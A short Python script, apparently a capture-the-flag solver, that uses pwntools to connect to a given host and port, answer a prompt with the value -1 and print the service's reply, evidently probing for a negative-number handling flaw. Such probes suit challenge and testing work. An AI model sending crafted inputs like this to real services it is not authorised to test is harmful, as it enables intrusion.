#!/usr/bin/env python3

from pwn import remote
import sys

server = sys.argv[1]
port = int(sys.argv[2])
r = remote(server, port)
r.recvuntil(':')
r.sendline(str(-1))
s = r.recvline()
print(s)
print(r.recvall(1).decode("utf-8", "ignore").strip())